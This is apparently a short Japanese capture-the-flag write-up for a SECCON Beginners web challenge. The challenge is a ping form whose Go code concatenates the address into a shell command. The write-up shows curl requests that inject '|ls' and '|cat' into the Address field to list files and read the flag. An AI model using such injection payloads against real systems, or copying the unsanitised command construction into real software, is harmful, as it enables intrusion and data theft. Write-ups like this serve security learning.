# Util

ping checkというタイトルとIPアドレスを入力するフォームがある

ソースコードを見るとAddressが結合されてそのままコマンドを叩くようになっている


```go
commnd := "ping -c 1 -W 1 " + param.Address + " 1>&2"
result, _ := exec.Command("sh", "-c", commnd).CombinedOutput()
```


OSコマンドインジェクションができそうだと推測


```sh
$ curl -X POST -d "Address=127.0.0.1|ls ../" https://util.quals.beginners.seccon.jp/util/ping
{"result":"app\nbin\ndev\netc\nflag_A74FIBkN9sELAjOc.txt\nhome\nlib\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n"}
```


`flag_A74FIBkN9sELAjOc.txt`というファイルがあることを確認できる

```sh
curl -X POST -d "Address=127.0.0.1|cat ../flag_A74FIBkN9sELAjOc.txt" https://util.quals.beginners.seccon.jp/util/ping
{"result":"ctf4b{al1_0vers_4re_i1l}\n"}
```

catでflagを入手
